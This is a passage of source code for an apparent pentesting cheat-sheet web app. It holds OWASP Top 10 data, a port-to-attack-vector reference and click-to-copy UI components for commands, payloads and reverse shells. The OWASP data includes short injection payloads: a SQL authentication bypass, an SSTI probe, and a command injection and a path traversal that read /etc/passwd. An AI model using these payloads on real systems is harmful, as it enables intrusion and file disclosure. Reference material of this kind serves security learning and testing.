          { cmd: "Invoke-AllChecks", desc: "Run all PowerUp privilege escalation checks", cat: "privesc" },
        ]},
      ],
    }],
  },
  {
    id: "owasp", icon: "🛡️", name: "OWASP Top 10",
    desc: "2021 classification of the most critical web application security risks",
    tags: ["owasp", "2021", "web", "appsec"],
    owasp: [
      { rank: 1, name: "Broken Access Control", sev: "critical", desc: "Access restrictions not properly enforced on authenticated users", examples: ["Modify URL or internal app state to bypass access checks", "View or edit another user's account data", "Accessing API without controls for POST/PUT/DELETE", "Elevate privileges: act as admin while logged in as user", "Tamper with JWT tokens to manipulate metadata", "CORS misconfiguration exposing API to unauthorised origins", "Force-browse to authenticated pages as unauthenticated"], methods: ["Change user ID parameter in URL (IDOR testing)", "Forced browsing to /admin paths", "Test missing function-level access control"], payloads: [{ p: "/user/profile?id=123 → /user/profile?id=456", d: "IDOR — access another user's profile by changing the ID", ctx: "Parameter manipulation" }], tools: ["Burp Suite", "OWASP ZAP", "Manual testing"] },
      { rank: 2, name: "Cryptographic Failures", sev: "high", desc: "Sensitive data exposed due to weak, missing, or misapplied encryption", examples: ["Transmitting sensitive data over HTTP, FTP, or SMTP", "Using deprecated algorithms like MD5, SHA-1, or DES", "Weak or hardcoded cryptographic keys", "No encryption for sensitive data at rest", "Improper TLS certificate validation"], tools: ["SSLScan", "testssl.sh", "Nmap SSL scripts"] },
      { rank: 3, name: "Injection", sev: "critical", desc: "Untrusted data sent to an interpreter as part of a command or query", types: ["SQL Injection", "NoSQL Injection", "OS Command Injection", "LDAP Injection", "XPath Injection", "XML Injection", "SSTI"], payloads: [{ p: "' OR 1=1 --", d: "Classic SQL injection authentication bypass", ctx: "Login form" }, { p: "{{7*7}}", d: "Template injection probe — 49 in output confirms SSTI", ctx: "Template fields" }, { p: "; cat /etc/passwd", d: "Append OS command to read the passwd file", ctx: "System calls" }, { p: "../../../etc/passwd", d: "Path traversal to read files outside the web root", ctx: "File operations" }], tools: ["sqlmap", "commix", "dotdotpwn"], covered: "See detailed SQL Injection and Command Injection sections" },
      { rank: 4, name: "Insecure Design", sev: "high", desc: "Missing or ineffective security controls at the architecture level", examples: ["No rate limiting — allows automated account takeover", "Missing business logic validation on sensitive operations", "Trusting client-side controls for security decisions", "Insufficient audit logging for critical actions"] },
      { rank: 5, name: "Security Misconfiguration", sev: "high", desc: "Insecure defaults, incomplete setup, overly permissive cloud storage", examples: ["Missing OS or framework security hardening", "Unnecessary features or services enabled", "Default admin accounts left active", "Stack traces exposed in error messages", "Outdated software with known vulnerabilities", "Missing security response headers"], methods: ["Test for default credentials on admin panels", "Check for directory listing on web roots", "Look for verbose error messages", "Audit HTTP methods (TRACE, PUT)", "Scan for missing security headers"], tools: ["Nikto", "Dirb", "Gobuster"] },
      { rank: 6, name: "Vulnerable & Outdated Components", sev: "high", desc: "Using libraries or frameworks with known, unpatched vulnerabilities", examples: ["Running unsupported or end-of-life software versions", "No regular vulnerability scanning of dependencies", "Insecure component configurations left at defaults"], tools: ["OWASP Dependency-Check", "Retire.js", "Snyk", "npm audit"] },
      { rank: 7, name: "Identification & Auth Failures", sev: "critical", desc: "Broken authentication and weak session management controls", examples: ["Brute-force attacks not rate-limited or blocked", "Default, weak, or well-known passwords permitted", "Weak credential recovery (security questions)", "No multi-factor authentication available", "Session tokens exposed in URLs", "Sessions not invalidated after logout"], methods: ["Test account lockout and rate limiting", "Check session fixation vulnerabilities", "Verify session timeout enforced server-side", "Test MFA bypass techniques"] },
      { rank: 8, name: "Software & Data Integrity Failures", sev: "critical", desc: "Code and infrastructure that lacks integrity verification", examples: ["CI/CD pipeline lacks integrity checks", "Auto-update mechanisms without cryptographic verification", "Insecure deserialization of untrusted data", "Loading JS from unverified CDN sources"], covered: "See Insecure Deserialization in Web Attacks section" },
      { rank: 9, name: "Security Logging & Monitoring Failures", sev: "medium", desc: "Insufficient logging leaves attacks undetected and response impossible", examples: ["Login failures and high-value events not logged", "Logs stored only locally — single point of failure", "No alerting on suspicious activity thresholds", "Incident response plan absent or untested"] },
      { rank: 10, name: "Server-Side Request Forgery (SSRF)", sev: "high", desc: "Web app fetches remote resources without validating user-supplied URLs", covered: "See detailed SSRF section in Web Attacks" },
    ],
  },
  {
    id: "ports", icon: "🔌", name: "Port Reference",
    desc: "Common TCP/UDP ports with associated services and known attack vectors",
    tags: ["tcp", "udp", "services", "enumeration"],
    ports: [
      { port: 20, svc: "FTP Data", vulns: ["Cleartext credentials", "Anonymous access"] },
      { port: 21, svc: "FTP Control", vulns: ["Cleartext credentials", "Anonymous access", "Brute force"] },
      { port: 22, svc: "SSH", vulns: ["Weak credentials", "Key exposure", "Version vulnerabilities"] },
      { port: 23, svc: "Telnet", vulns: ["Cleartext credentials", "No encryption"] },
      { port: 25, svc: "SMTP", vulns: ["Email spoofing", "Open relay", "User enumeration"] },
      { port: 53, svc: "DNS", vulns: ["Zone transfer", "DNS amplification", "Cache poisoning"] },
      { port: 80, svc: "HTTP", vulns: ["Web application attacks", "Cleartext traffic"] },
      { port: 110, svc: "POP3", vulns: ["Cleartext credentials", "Email harvesting"] },
      { port: 135, svc: "MSRPC", vulns: ["Windows enumeration", "RPC exploits"] },
      { port: 139, svc: "NetBIOS", vulns: ["SMB enumeration", "Null sessions"] },
      { port: 143, svc: "IMAP", vulns: ["Cleartext credentials", "Email harvesting"] },
      { port: 161, svc: "SNMP", vulns: ["Community string brute force", "Information disclosure"] },
      { port: 389, svc: "LDAP", vulns: ["LDAP injection", "Anonymous bind"] },
      { port: 443, svc: "HTTPS", vulns: ["SSL/TLS vulnerabilities", "Certificate issues"] },
      { port: 445, svc: "SMB", vulns: ["EternalBlue (MS17-010)", "PSExec", "Credential theft"] },
      { port: 1433, svc: "MSSQL", vulns: ["SQL injection", "xp_cmdshell", "Weak credentials"] },
      { port: 1521, svc: "Oracle DB", vulns: ["SQL injection", "Default credentials"] },
      { port: 3306, svc: "MySQL", vulns: ["SQL injection", "Weak credentials", "UDF exploitation"] },
      { port: 3389, svc: "RDP", vulns: ["BlueKeep (CVE-2019-0708)", "Weak credentials", "Brute force"] },
      { port: 5432, svc: "PostgreSQL", vulns: ["SQL injection", "Command execution"] },
      { port: 5900, svc: "VNC", vulns: ["Weak/no authentication", "Screen capture"] },
      { port: 5985, svc: "WinRM", vulns: ["Default creds", "PTH via CME", "Evil-WinRM"] },
      { port: 6379, svc: "Redis", vulns: ["No authentication", "Remote code execution"] },
      { port: 8080, svc: "HTTP Proxy", vulns: ["Web application attacks", "Tomcat exploits"] },
      { port: 8443, svc: "HTTPS Alt", vulns: ["SSL/TLS issues", "Web app vulnerabilities"] },
      { port: 27017, svc: "MongoDB", vulns: ["No authentication", "NoSQL injection"] },
    ],
  },
];

/* ─────────────────────────────────────────────────────────
   RESPONSIVE GLOBAL CSS — Mobile First
───────────────────────────────────────────────────────── */
const GLOBAL_CSS = `
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

  :root {
    --cy: #00ffe7;
    --cyd: rgba(0,255,231,0.7);
    --cyb: rgba(0,255,231,0.08);
    --red: #ff2d55;
    --blue: #3b82f6;
    --pur: #a855f7;
    --amb: #fbbf24;
    --grn: #34d399;
    --sidebar-w: 220px;
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html { font-size: 16px; -webkit-text-size-adjust: 100%; }
  body, html { background: #000; min-height: 100vh; overflow-x: hidden; }
  .mono { font-family: 'Share Tech Mono', monospace; }
  .orbit { font-family: 'Orbitron', sans-serif; }

  /* ── Scrollbar ── */
  ::-webkit-scrollbar { width: 3px; height: 3px; }
  ::-webkit-scrollbar-track { background: rgba(0,0,0,.5); }
  ::-webkit-scrollbar-thumb { background: rgba(0,255,231,.18); border-radius: 2px; }

  /* ── Animations ── */
  @keyframes scanY    { 0%{top:-2px} 100%{top:100vh} }
  @keyframes blink    { 0%,100%{opacity:1} 50%{opacity:0} }
  @keyframes sweep    { to{left:200%} }
  @keyframes hsweep   { 0%{left:-33%} 100%{left:133%} }
  @keyframes slscan   { 0%{left:-50%} 100%{left:150%} }
  @keyframes neonPulse{ 0%,100%{text-shadow:0 0 4px var(--cy),0 0 12px rgba(0,255,231,.4)} 50%{text-shadow:0 0 10px var(--cy),0 0 30px rgba(0,255,231,.6),0 0 60px rgba(0,255,231,.25)} }
  @keyframes copyFlash{ 0%{background:rgba(0,255,100,.18)} 100%{background:transparent} }
  @keyframes drawerIn { from{transform:translateX(-100%)} to{transform:translateX(0)} }
  @keyframes drawerOut{ from{transform:translateX(0)} to{transform:translateX(-100%)} }
  @keyframes fadeIn   { from{opacity:0} to{opacity:1} }

  /* ── Scan lines ── */
  .scan-line-inner {
    position: absolute; inset-block: 0; width: 50%;
    background: linear-gradient(90deg, transparent, rgba(255,80,80,.55), transparent);
    animation: slscan 2.5s ease-in-out infinite 1.5s;
  }
  .scan-line-inner-amber {
    position: absolute; inset-block: 0; width: 50%;
    background: linear-gradient(90deg, transparent, rgba(255,170,0,.7), transparent);
    animation: slscan 3s ease-in-out infinite 2s;
  }

  /* ── Nav sweep effect ── */
  .nav-sweep { position: relative; overflow: hidden; }
  .nav-sweep::after {
    content: ''; position: absolute; inset-block: 0; width: 40%;
    background: linear-gradient(90deg, transparent, rgba(0,255,231,.06), transparent);
    left: -100%; pointer-events: none;
  }
  .nav-sweep:hover::after { animation: sweep .5s ease forwards; }

  /* ── Collapsible ── */
  .collapsible { overflow: hidden; transition: max-height .28s cubic-bezier(.4,0,.2,1), opacity .22s; }
  .collapsible.closed { max-height: 0; opacity: 0; }
  .collapsible.open   { max-height: 9999px; opacity: 1; }

  /* ── Interaction rows ── */
  .cmd-row {
    transition: border-color .15s, background .15s, box-shadow .15s;
    cursor: pointer; user-select: none; position: relative;
  }
  .cmd-row:hover {
    border-color: var(--cy) !important;
    background: rgba(0,28,38,.95) !important;
    box-shadow: 0 0 0 1px rgba(0,255,231,.12), inset 0 0 20px rgba(0,255,231,.03);
  }
  .cmd-row:active { transform: scale(0.995); }
  .cmd-row.copied { animation: copyFlash .5s ease forwards; }

  .pay-row {
    transition: border-color .15s, background .15s;
    cursor: pointer; user-select: none;
  }
  .pay-row:hover  { border-color: #ff8800 !important; background: rgba(70,30,0,.85) !important; }
  .pay-row:active { transform: scale(0.995); }
  .pay-row.copied { animation: copyFlash .5s ease forwards; }

  .port-card { transition: border-color .2s, box-shadow .2s; }
  .port-card:hover { border-color: rgba(0,255,231,.28) !important; box-shadow: 0 0 14px rgba(0,255,231,.05); }

  .nav-btn { transition: background .15s, color .15s; }
  .nav-btn:hover { background: rgba(0,255,231,.07); color: rgba(0,255,231,.85); }

  .neon-text { animation: neonPulse 3s ease-in-out infinite; }

  .tool-card { transition: border-color .2s, box-shadow .2s; }
  .tool-card:hover { border-color: rgba(0,255,231,.25) !important; box-shadow: 0 0 20px rgba(0,255,231,.04); }

  /* ── Copy toast ── */
  .copy-toast {
    position: fixed; bottom: 16px; right: 16px; z-index: 9999;
    background: rgba(0,20,16,.97); border: 1px solid rgba(0,255,160,.4);
    color: #00ffaa; font-family: 'Share Tech Mono', monospace;
    font-size: 11px; padding: 8px 16px; border-radius: 8px;
    display: flex; align-items: center; gap: 8px;
    opacity: 0; transform: translateY(8px);
    transition: opacity .2s, transform .2s;
    pointer-events: none;
    box-shadow: 0 0 20px rgba(0,255,160,.15);
  }
  .copy-toast.visible { opacity: 1; transform: none; }

  /* ── Hint badges ── */
  .click-hint {
    font-size: 8px; padding: 2px 6px; border-radius: 4px;
    border: 1px solid rgba(0,255,231,.15);
    background: rgba(0,255,231,.04); color: rgba(0,255,231,.28);
    font-family: 'Share Tech Mono', monospace;
    white-space: nowrap; flex-shrink: 0;
    transition: all .15s; pointer-events: none; letter-spacing: .03em;
  }
  .cmd-row:hover  .click-hint { border-color: rgba(0,255,231,.4); background: rgba(0,255,231,.08); color: rgba(0,255,231,.7); }
  .cmd-row.copied .click-hint { border-color: rgba(0,255,130,.5); background: rgba(0,60,30,.6); color: #00ff88; }
  .pay-click-hint {
    font-size: 8px; padding: 2px 6px; border-radius: 4px;
    border: 1px solid rgba(255,136,0,.18);
    background: rgba(255,136,0,.04); color: rgba(255,136,0,.3);
    font-family: 'Share Tech Mono', monospace;
    white-space: nowrap; flex-shrink: 0;
    transition: all .15s; pointer-events: none;
  }
  .pay-row:hover  .pay-click-hint { border-color: rgba(255,136,0,.45); background: rgba(255,136,0,.08); color: rgba(255,136,0,.75); }
  .pay-row.copied .pay-click-hint { border-color: rgba(0,255,130,.5); background: rgba(0,60,30,.6); color: #00ff88; }

  /* ── Mobile drawer overlay ── */
  .drawer-overlay {
    display: none;
    position: fixed; inset: 0; z-index: 40;
    background: rgba(0,0,0,.6);
    animation: fadeIn .2s ease;
  }
  .drawer-overlay.open { display: block; }

  /* ── Mobile sidebar drawer ── */
  .sidebar-drawer {
    position: fixed; top: 0; left: 0; bottom: 0; width: min(280px, 85vw);
    z-index: 50; transform: translateX(-100%);
    transition: transform .28s cubic-bezier(.4,0,.2,1);
    background: rgba(0,8,12,.98);
    border-right: 1px solid rgba(0,255,231,.12);
    display: flex; flex-direction: column;
    overflow: hidden;
  }
  .sidebar-drawer.open { transform: translateX(0); }

  /* ── Desktop sidebar (always visible ≥ 768px) ── */
  .sidebar-desktop {
    width: var(--sidebar-w); min-width: 180px; flex-shrink: 0;
    background: rgba(0,8,12,.96);
    border-right: 1px solid rgba(0,255,231,.1);
    display: none; flex-direction: column; z-index: 10;
    backdrop-filter: blur(20px);
  }

  /* ── Hamburger ── */
  .hamburger {
    display: flex; flex-direction: column; justify-content: center;
    gap: 4px; width: 32px; height: 32px;
    background: transparent; border: 1px solid rgba(0,255,231,.2);
    border-radius: 6px; cursor: pointer; padding: 5px 6px;
    flex-shrink: 0;
  }
  .hamburger span {
    display: block; height: 1.5px; width: 100%;
    background: var(--cy); border-radius: 1px;
    transition: all .2s;
  }

  /* ── Responsive breakpoints ── */

  /* Tablet: ≥ 640px — hide hamburger, compact sidebar as sheet */
  @media (min-width: 640px) {
    .hamburger { display: none; }
    .sidebar-drawer { display: flex !important; position: relative; top: auto; left: auto; bottom: auto; width: var(--sidebar-w); transform: none !important; z-index: 10; border-right: 1px solid rgba(0,255,231,.1); }
    .drawer-overlay { display: none !important; }
    .sidebar-desktop { display: none; }
    .mobile-header { display: flex; }
  }

  /* Desktop/Laptop: ≥ 900px — bigger sidebar, full layout */
  @media (min-width: 900px) {
    .sidebar-drawer { display: none !important; }
    .sidebar-desktop { display: flex !important; }
    .mobile-header { display: none !important; }
    .drawer-overlay { display: none !important; }
  }

  /* ── Content padding adapts ── */
  .content-area {
    padding: 12px 12px;
  }
  @media (min-width: 480px)  { .content-area { padding: 14px 16px; } }
  @media (min-width: 768px)  { .content-area { padding: 16px 20px; } }
  @media (min-width: 1200px) { .content-area { padding: 18px 24px; } }

  /* ── Port grid columns ── */
  .port-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
    gap: 8px;
  }
  @media (min-width: 480px)  { .port-grid { grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); } }
  @media (min-width: 768px)  { .port-grid { grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 10px; } }
  @media (min-width: 1200px) { .port-grid { grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); } }

  /* ── Command row text shrinks slightly on mobile ── */
  .cmd-text { font-size: 10.5px; }
  @media (min-width: 480px) { .cmd-text { font-size: 11px; } }
  @media (min-width: 768px) { .cmd-text { font-size: 11.5px; } }

  /* ── Header nav buttons hidden on small screens ── */
  .nav-controls { display: none; }
  @media (min-width: 480px) { .nav-controls { display: flex; } }

  /* ── Search bar ── */
  .search-input { font-size: 12px; }
  @media (min-width: 480px) { .search-input { font-size: 11px; } }

  /* ── Tags wrap ── */
  .tag-row { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }

  /* ── Touch-friendly tap targets (min 44px) ── */
  @media (max-width: 767px) {
    .nav-btn { padding: 9px 9px !important; min-height: 40px; }
    .cmd-row  { padding: 10px 10px !important; }
    .pay-row  { padding: 10px 10px !important; }
  }

  /* ── Sidebar nav scrollbar hidden on mobile ── */
  .sidebar-nav { overflow-y: auto; scrollbar-width: thin; }

  /* ── Prevent body scroll when drawer open ── */
  body.drawer-open { overflow: hidden; }
`;

/* ─────────────────────────────────────────────────────────
   HELPERS
───────────────────────────────────────────────────────── */
function getSev(s = "low"): SevInfo {
  const k = (s || "low").toLowerCase();
  if (k === "critical") return { bg: "rgba(255,40,70,.08)",  border: "rgba(255,40,70,.3)",  color: "#ff4466" };
  if (k === "high")     return { bg: "rgba(255,90,0,.08)",   border: "rgba(255,90,0,.28)",  color: "#ff7722" };
  if (k === "medium")   return { bg: "rgba(255,190,0,.06)",  border: "rgba(255,190,0,.22)", color: "#ffcc00" };
  return                       { bg: "rgba(0,90,200,.07)",   border: "rgba(0,90,200,.22)",  color: "#55aaff" };
}

/* ─────────────────────────────────────────────────────────
   COPY TOAST
───────────────────────────────────────────────────────── */
const CopyToast = memo(({ visible }: { visible: boolean }): React.ReactElement => (
  <div className={`copy-toast${visible ? " visible" : ""}`}>
    <span style={{ fontSize: 13 }}>✓</span>
    <span>copied to clipboard</span>
  </div>
));
CopyToast.displayName = "CopyToast";

/* ─────────────────────────────────────────────────────────
   useCopy
───────────────────────────────────────────────────────── */
function useCopy(): { copy: (t: string) => void; toastVisible: boolean } {
  const [toastVisible, setToastVisible] = useState<boolean>(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const copy = useCallback((text: string): void => {
    navigator.clipboard.writeText(text).catch(() => {});
    setToastVisible(true);
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => setToastVisible(false), 1800);
  }, []);
  return { copy, toastVisible };
}

/* ─────────────────────────────────────────────────────────
   PARTICLE FIELD — only on ≥ 768px
───────────────────────────────────────────────────────── */
const ParticleField = memo((): React.ReactElement => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  useEffect(() => {
    const canvas = canvasRef.current!;
    const ctx = canvas.getContext("2d")!;
    const resize = (): void => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
    resize();
    window.addEventListener("resize", resize);
    const particles: Particle[] = Array.from({ length: 40 }, () => ({
      x: Math.random() * canvas.width, y: Math.random() * canvas.height,
      vx: (Math.random() - .5) * .25, vy: (Math.random() - .5) * .25,
      r: Math.random() * 1.1 + .3,
      color: Math.random() > .5 ? "#00ffe7" : Math.random() > .5 ? "#3b82f6" : "#a855f7",
      opacity: Math.random() * .3 + .07,
    }));
    let animId: number;
    const draw = (): void => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x, dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < 90) { ctx.beginPath(); ctx.strokeStyle = `rgba(0,255,231,${(1 - dist / 90) * .06})`; ctx.lineWidth = .3; ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y); ctx.stroke(); }
        }
        const p = particles[i];
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = p.color; ctx.globalAlpha = p.opacity;
        ctx.shadowColor = p.color; ctx.shadowBlur = 3; ctx.fill();
        ctx.globalAlpha = 1; ctx.shadowBlur = 0;
      }
      animId = requestAnimationFrame(draw);
    };
    draw();
    return () => { cancelAnimationFrame(animId); window.removeEventListener("resize", resize); };
  }, []);
  return <canvas ref={canvasRef} style={{ position: "fixed", inset: 0, width: "100%", height: "100%", pointerEvents: "none", zIndex: 0, opacity: .4 }} />;
});
ParticleField.displayName = "ParticleField";

/* ─────────────────────────────────────────────────────────
   SECTION LABEL
───────────────────────────────────────────────────────── */
const SecLabel = ({ label }: { label: string }): React.ReactElement => (
  <div className="orbit" style={{ fontSize: 9, color: "rgba(0,255,231,.38)", letterSpacing: ".16em", fontWeight: 700, marginBottom: 6, paddingBottom: 5, borderBottom: "1px solid rgba(0,255,231,.08)", display: "flex", alignItems: "center", gap: 5 }}>
    <span style={{ display: "inline-block", width: 3, height: 8, background: "var(--cy)", borderRadius: 1, boxShadow: "0 0 4px var(--cy)" }} />
    {label}
  </div>
);

/* ─────────────────────────────────────────────────────────
   COMMAND ROW
───────────────────────────────────────────────────────── */
const CommandRow = memo(({ cmd, onCopy }: { cmd: Command; onCopy: (t: string) => void }): React.ReactElement => {
  const [copied, setCopied] = useState<boolean>(false);
  const handleClick = useCallback((): void => { onCopy(cmd.cmd); setCopied(true); setTimeout(() => setCopied(false), 1500); }, [cmd.cmd, onCopy]);
  return (
    <div className={`cmd-row${copied ? " copied" : ""}`} onClick={handleClick} title="Click to copy"
      style={{ display: "flex", alignItems: "flex-start", gap: 8, padding: "9px 10px", background: "rgba(0,16,22,.8)", borderRadius: 8, border: "1px solid rgba(0,255,231,.1)", borderLeft: "2px solid rgba(0,200,180,.25)" }}>
      <div style={{ flex: 1, minWidth: 0 }}>
        <div className={`mono cmd-text`} style={{ color: "var(--cy)", wordBreak: "break-all", lineHeight: 1.55 }}>
          <span style={{ color: "rgba(0,255,231,.35)", marginRight: 4 }}>$</span>{cmd.cmd}
        </div>
        <div className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.3)", marginTop: 3, lineHeight: 1.4 }}>{cmd.desc}</div>
      </div>
      <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4, flexShrink: 0 }}>
        {cmd.cat && <span className="mono" style={{ fontSize: 8, padding: "1px 5px", borderRadius: 4, background: "rgba(0,255,231,.06)", color: "rgba(0,255,231,.32)", border: "1px solid rgba(0,255,231,.1)" }}>{cmd.cat}</span>}
        <span className="click-hint">{copied ? "✓ copied" : "click to copy"}</span>
      </div>
    </div>
  );
});
CommandRow.displayName = "CommandRow";

/* ─────────────────────────────────────────────────────────
   PAYLOAD ROW
───────────────────────────────────────────────────────── */
const PayloadRow = memo(({ item, onCopy }: { item: Payload; onCopy: (t: string) => void }): React.ReactElement => {
  const [copied, setCopied] = useState<boolean>(false);
  const handleClick = useCallback((): void => { onCopy(item.p); setCopied(true); setTimeout(() => setCopied(false), 1500); }, [item.p, onCopy]);
  return (
    <div className={`pay-row${copied ? " copied" : ""}`} onClick={handleClick} title="Click to copy"
      style={{ display: "flex", alignItems: "flex-start", gap: 8, padding: "9px 10px", background: "rgba(55,22,0,.65)", borderRadius: 8, border: "1px solid rgba(180,80,0,.18)", borderLeft: "2px solid rgba(180,100,0,.35)" }}>
      <div style={{ flex: 1, minWidth: 0 }}>
        <code className="mono" style={{ display: "block", fontSize: 11, color: "#ff8800", wordBreak: "break-all", lineHeight: 1.55 }}>{item.p}</code>
        <div className="mono" style={{ fontSize: 9, color: "rgba(255,136,0,.38)", marginTop: 3, lineHeight: 1.4 }}>{item.d}{item.ctx ? ` · [${item.ctx}]` : ""}</div>
      </div>
      <span className="pay-click-hint">{copied ? "✓ copied" : "click to copy"}</span>
    </div>
  );
});
PayloadRow.displayName = "PayloadRow";

/* ─────────────────────────────────────────────────────────
   SHELL ROW
───────────────────────────────────────────────────────── */
const ShellRow = memo(({ shell, onCopy }: { shell: ReverseShell; onCopy: (t: string) => void }): React.ReactElement => {
  const [copied, setCopied] = useState<boolean>(false);
  const handleClick = useCallback((): void => { onCopy(shell.cmd); setCopied(true); setTimeout(() => setCopied(false), 1500); }, [shell.cmd, onCopy]);
  return (
    <div className={`cmd-row${copied ? " copied" : ""}`} onClick={handleClick} title="Click to copy"
      style={{ padding: "9px 10px", borderRadius: 8, marginBottom: 5, background: "rgba(0,18,45,.7)", border: "1px solid rgba(0,90,200,.18)", borderLeft: "2px solid rgba(0,120,230,.35)" }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 4 }}>
        <div className="orbit" style={{ fontSize: 9, color: "rgba(100,180,255,.7)", fontWeight: 700 }}>{shell.name}</div>
        <span className="click-hint">{copied ? "✓ copied" : "click to copy"}</span>
      </div>
      <code className="mono" style={{ display: "block", fontSize: 10, color: "#aad4ff", wordBreak: "break-all", lineHeight: 1.5 }}>{shell.cmd}</code>
      <div className="mono" style={{ fontSize: 9, color: "rgba(100,180,255,.32)", marginTop: 4 }}>{shell.d}</div>
    </div>
  );
});
ShellRow.displayName = "ShellRow";

/* ─────────────────────────────────────────────────────────
   EXPLOIT CARD
───────────────────────────────────────────────────────── */
const ExploitCard = memo(({ exploit, onCopy }: { exploit: CSRFExploit; onCopy: (t: string) => void }): React.ReactElement => {
  const [copied, setCopied] = useState<boolean>(false);
  const handleClick = useCallback((): void => { onCopy(exploit.code); setCopied(true); setTimeout(() => setCopied(false), 1500); }, [exploit.code, onCopy]);
  return (
    <div className={`cmd-row${copied ? " copied" : ""}`} onClick={handleClick} title="Click to copy"
      style={{ border: "1px solid rgba(160,50,220,.3)", borderRadius: 9, overflow: "hidden", marginBottom: 8, background: "rgba(28,0,48,.6)", cursor: "pointer" }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "7px 12px", background: "rgba(50,0,80,.55)", borderBottom: "1px solid rgba(160,50,220,.2)" }}>
        <span className="orbit" style={{ fontSize: 10, color: "#cc88ff", fontWeight: 700 }}>{exploit.name}</span>
        <span className="click-hint" style={{ borderColor: "rgba(160,50,220,.3)", color: "rgba(180,100,255,.5)" }}>{copied ? "✓ copied" : "click to copy"}</span>
      </div>
      <pre className="mono" style={{ padding: "9px 12px", fontSize: 10, color: "rgba(180,120,255,.75)", whiteSpace: "pre-wrap", wordBreak: "break-all", lineHeight: 1.55, background: "rgba(20,0,35,.45)", maxHeight: 140, overflowY: "auto" }}>{exploit.code}</pre>
      <div className="mono" style={{ padding: "5px 12px 8px", fontSize: 9, color: "rgba(160,50,220,.38)" }}>{exploit.d}</div>
    </div>
  );
});
ExploitCard.displayName = "ExploitCard";

/* ─────────────────────────────────────────────────────────
   EXAMPLE CARD
───────────────────────────────────────────────────────── */
const ExampleCard = memo(({ ex, onCopy }: { ex: DeserializationExample; onCopy: (t: string) => void }): React.ReactElement => {
  const [copied, setCopied] = useState<boolean>(false);
  const handleClick = useCallback((): void => { onCopy(ex.p); setCopied(true); setTimeout(() => setCopied(false), 1500); }, [ex.p, onCopy]);
  return (
    <div className={`cmd-row${copied ? " copied" : ""}`} onClick={handleClick} title="Click to copy"
      style={{ border: "1px solid rgba(255,150,50,.3)", borderRadius: 9, overflow: "hidden", marginBottom: 8, background: "rgba(48,18,0,.55)", cursor: "pointer" }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "7px 12px", background: "rgba(80,40,0,.5)", borderBottom: "1px solid rgba(255,150,50,.2)" }}>
        <span className="orbit" style={{ fontSize: 10, color: "#ffb84d", fontWeight: 700 }}>{ex.lang}</span>
        <span className="click-hint" style={{ borderColor: "rgba(255,150,50,.3)", color: "rgba(255,150,50,.5)" }}>{copied ? "✓ copied" : "click to copy"}</span>
      </div>
      <pre className="mono" style={{ padding: "9px 12px", fontSize: 10, color: "rgba(255,170,80,.82)", whiteSpace: "pre-wrap", wordBreak: "break-all", lineHeight: 1.55, background: "rgba(50,25,0,.35)" }}>{ex.p}</pre>
      <div className="mono" style={{ padding: "5px 12px 8px", fontSize: 9, color: "rgba(255,150,50,.38)" }}>{ex.d}</div>
    </div>
  );
});
ExampleCard.displayName = "ExampleCard";

/* ─────────────────────────────────────────────────────────
   TOOL CARD
───────────────────────────────────────────────────────── */
const ToolCard = memo(({ tool, searchQ, onCopy }: { tool: Tool; searchQ: string; onCopy: (t: string) => void }): React.ReactElement | null => {
  const [open, setOpen] = useState<boolean>(true);
  const filteredCmds: Command[] = searchQ
    ? tool.commands.filter(c => c.cmd.toLowerCase().includes(searchQ.toLowerCase()) || c.desc.toLowerCase().includes(searchQ.toLowerCase()) || (c.cat || "").toLowerCase().includes(searchQ.toLowerCase()))
    : tool.commands;
  if (searchQ && filteredCmds.length === 0 && !tool.name.toLowerCase().includes(searchQ.toLowerCase())) return null;
  return (
    <div className="tool-card" style={{ border: "1px solid rgba(0,255,231,.1)", borderRadius: 10, overflow: "hidden", marginBottom: 8, background: "rgba(0,10,14,.88)" }}>
      <button onClick={() => setOpen(v => !v)} className="nav-sweep"
        style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "space-between", padding: "11px 12px", background: "transparent", border: "none", cursor: "pointer", textAlign: "left" }}>
        <div style={{ minWidth: 0, flex: 1 }}>
          <div className="orbit" style={{ fontSize: 11, fontWeight: 700, color: "var(--cy)", letterSpacing: ".03em" }}>{tool.name}</div>
          {tool.desc && <div className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.3)", marginTop: 2 }}>{tool.desc}</div>}
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0, marginLeft: 8 }}>
          <span className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.2)" }}>{filteredCmds.length} cmd{filteredCmds.length !== 1 ? "s" : ""}</span>
          <span className="mono" style={{ fontSize: 10, color: "rgba(0,255,231,.4)", display: "inline-block", transform: open ? "rotate(90deg)" : "none", transition: "transform .2s" }}>▶</span>
        </div>
      </button>
      {tool.note && <div className="mono" style={{ padding: "5px 12px", fontSize: 9, color: "#cc8800", background: "rgba(80,50,0,.4)", borderBottom: "1px solid rgba(200,130,0,.2)" }}>⚠ {tool.note}</div>}
